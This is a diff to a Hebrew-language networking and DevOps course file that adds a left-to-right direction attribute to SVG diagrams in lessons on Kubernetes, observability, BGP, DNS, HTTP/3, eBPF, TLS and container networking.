   <text x="87" y="20" text-anchor="middle" font-size="10" fill="#94a3b8">Virtual Machines</text>
   <rect x="12" y="25" width="70" height="55" rx="4" fill="#0f2744"/>
@@ -7591,7 +7591,7 @@ docker network create --driver overlay --attachable prod-net</code></pre></div>
 <p>במקום "הפעל <code>container</code>", אתה מגדיר <strong>מצב רצוי</strong>.</p>
 <p><code>K8s</code> דואג שהמצב הזה תמיד יתקיים.</p>
 <div class="diagram-container">
-<svg viewBox="0 0 360 120" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 120" class="content-diagram">
   <rect x="5" y="5" width="350" height="110" rx="8" fill="#0f172a" stroke="#334155" stroke-width="1.5"/>
   <text x="180" y="20" text-anchor="middle" font-size="10" fill="#94a3b8">Kubernetes Cluster</text>
   <rect x="15" y="28" width="150" height="75" rx="6" fill="#1e293b" stroke="#475569" stroke-width="1"/>
@@ -8158,7 +8158,7 @@ ansible-playbook -i inventory playbook.yml</code></pre></div>
 <p>מערכת מודרנית חייבת להיות <strong><code>observable</code></strong>.</p>
 <p>לא מספיק שהיא עובדת — היא צריכה לחשוף את מצבה הפנימי.</p>
 <div class="diagram-container">
-<svg viewBox="0 0 360 120" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 120" class="content-diagram">
   <rect x="10" y="10" width="100" height="95" rx="8" fill="#1e3a5f" stroke="#3b82f6" stroke-width="1.5"/>
   <text x="60" y="35" text-anchor="middle" font-size="13" fill="#93c5fd">📊</text>
   <text x="60" y="55" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">Metrics</text>
@@ -8550,7 +8550,7 @@ ALERT HighErrorRate
 <p><strong>דוגמה</strong></p>
 <p>"כשה-<code>deployment</code> יצא בשעה 14:30, ה-<code>latency</code> עלה ב-40%".</p>
 <div class="diagram-container">
-<svg viewBox="0 0 360 130" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 130" class="content-diagram">
   <rect x="10" y="10" width="100" height="50" rx="6" fill="#1e293b" stroke="#3b82f6" stroke-width="1.5"/>
   <text x="60" y="30" text-anchor="middle" font-size="10" fill="#93c5fd">Services</text>
   <text x="60" y="46" text-anchor="middle" font-size="9" fill="#64748b">/metrics endpoint</text>
@@ -8639,7 +8639,7 @@ ALERT HighErrorRate
         content: `<div dir="rtl">
 <h2>ArgoCD — GitOps Controller</h2>
 <div class="diagram-container">
-<svg viewBox="0 0 360 130" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 130" class="content-diagram">
   <rect x="10" y="40" width="80" height="40" rx="6" fill="#1e293b" stroke="#f59e0b" stroke-width="1.5"/>
   <text x="50" y="57" text-anchor="middle" font-size="10" fill="#fcd34d">Git Repo</text>
   <text x="50" y="72" text-anchor="middle" font-size="9" fill="#64748b">manifests</text>
@@ -8744,7 +8744,7 @@ argocd app rollback my-app 3</code></pre>
 <p>רוב האנשים פותחים <code>Wireshark</code> ורואים גל של חבילות צבעוניות.</p>
 <p>אנליסטים מקצועיים קוראים <strong>סיפורים</strong> — מה קרה, מתי, ולמה.</p>
 <div class="diagram-container">
-<svg viewBox="0 0 360 130" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 130" class="content-diagram">
   <text x="180" y="16" text-anchor="middle" font-size="12" fill="#e2e8f0" font-weight="bold">TCP State Machine — החיים של חיבור</text>
   <rect x="10" y="25" width="80" height="22" rx="4" fill="#1e3a5f"/>
   <text x="50" y="40" text-anchor="middle" font-size="10" fill="#7dd3fc">CLOSED</text>
@@ -8860,7 +8860,7 @@ sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)</code></pre></div>
 <p>פרוטוקול הניתוב היחיד שפועל בין <code>Autonomous Systems</code>.</p>
 <p>ה-<code>Autonomous Systems</code> הם הארגונים, ספקי האינטרנט והחברות שמרכיבים יחד את האינטרנט.</p>
 <div class="diagram-container">
-<svg viewBox="0 0 360 140" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 140" class="content-diagram">
   <text x="180" y="15" text-anchor="middle" font-size="12" fill="#e2e8f0" font-weight="bold">iBGP vs eBGP</text>
   <rect x="10" y="25" width="150" height="100" rx="8" fill="#1e293b" stroke="#3b82f6" stroke-width="2"/>
   <text x="85" y="42" text-anchor="middle" font-size="11" fill="#93c5fd" font-weight="bold">AS 65001 (ISP A)</text>
@@ -8972,7 +8972,7 @@ route-map BACKUP_LINK permit 10
 <p><code>DNS resolution</code> נראה פשוט.</p>
 <p>בפועל זה ריקוד מדויק בין 5 שחקנים שונים.</p>
 <div class="diagram-container">
-<svg viewBox="0 0 360 155" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 155" class="content-diagram">
   <text x="180" y="14" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">DNS Full Resolution Flow</text>
   <rect x="5" y="22" width="70" height="20" rx="4" fill="#1e3a5f"/>
   <text x="40" y="36" text-anchor="middle" font-size="9" fill="#7dd3fc">Client</text>
@@ -9086,7 +9086,7 @@ dig +dnssec cloudflare.com
 <p><code>HTTP/2</code> הביא <code>multiplexing</code> — שליחת מספר <code>streams</code> בחיבור <code>TCP</code> אחד.</p>
 <p>אבל <code>TCP</code> לא יודע שיש כמה <code>streams</code>.</p>
 <div class="diagram-container">
-<svg viewBox="0 0 360 130" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 130" class="content-diagram">
   <text x="180" y="14" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">HOL Blocking — HTTP/2 vs HTTP/3</text>
   <text x="90" y="30" text-anchor="middle" font-size="10" fill="#f87171" font-weight="bold">HTTP/2 over TCP</text>
   <rect x="10" y="38" width="50" height="14" rx="3" fill="#1e3a5f"/>
@@ -9194,7 +9194,7 @@ QUIC 0-RTT (חיבור חוזר):
 <p>אין צורך לשנות קוד גרעין ולא לטעון <code>module</code>.</p>
 <p>הגרעין מריץ <code>bytecode</code> שעבר אימות מוקדם.</p>
 <div class="diagram-container">
-<svg viewBox="0 0 360 140" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 140" class="content-diagram">
   <text x="180" y="14" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">eBPF Architecture</text>
   <rect x="10" y="22" width="160" height="30" rx="6" fill="#1e293b" stroke="#64748b"/>
   <text x="90" y="41" text-anchor="middle" font-size="10" fill="#94a3b8">User Space — eBPF Program (C)</text>
@@ -9355,7 +9355,7 @@ int mitigate_ddos(struct xdp_md *ctx) {
         content: `<div dir="rtl">
 <h2>TLS 1.2 (2-RTT) vs TLS 1.3 (1-RTT)</h2>
 <div class="diagram-container">
-<svg viewBox="0 0 360 130" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 130" class="content-diagram">
   <text x="60" y="14" text-anchor="middle" font-size="10" fill="#93c5fd">TLS 1.2 — 2 RTT</text>
   <text x="240" y="14" text-anchor="middle" font-size="10" fill="#86efac">TLS 1.3 — 1 RTT</text>
   <line x1="20" y1="20" x2="20" y2="128" stroke="#475569" stroke-width="1"/>
@@ -9528,7 +9528,7 @@ bgpq4 -4 -A -J AS13335</code></pre>
   <tr><td>2021</td><td><code>Vodafone AS55410</code></td><td>חטיפת <code>prefixes</code> של <code>Facebook</code></td><td>תרם לנפילת <code>Facebook</code> באוקטובר 2021</td></tr>
 </table>
 <div class="diagram-container">
-<svg viewBox="0 0 360 130" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 130" class="content-diagram">
   <text x="180" y="14" text-anchor="middle" font-size="11" fill="#e2e8f0" font-weight="bold">RPKI Validation Flow</text>
   <rect x="10" y="25" width="80" height="35" rx="5" fill="#1e293b" stroke="#3b82f6" stroke-width="1.5"/>
   <text x="50" y="40" text-anchor="middle" font-size="9" fill="#93c5fd">RIR (RIPE/ARIN)</text>
@@ -9602,7 +9602,7 @@ ip netns exec container1 ip addr add 172.17.0.2/16 dev veth1</code></pre>
         content: `<div dir="rtl">
 <h2><code>veth pairs</code>, <code>Bridge</code> ו-<code>NAT</code></h2>
 <div class="diagram-container">
-<svg viewBox="0 0 360 130" class="content-diagram">
+<svg direction="ltr" viewBox="0 0 360 130" class="content-diagram">
   <rect x="5" y="5" width="350" height="120" rx="6" fill="#0f172a" stroke="#334155" stroke-width="1"/>
   <text x="180" y="18" text-anchor="middle" font-size="9" fill="#64748b">Host Network Namespace</text>
   <rect x="20" y="25" width="70" height="35" rx="4" fill="#1e293b" stroke="#3b82f6" stroke-width="1.5"/>
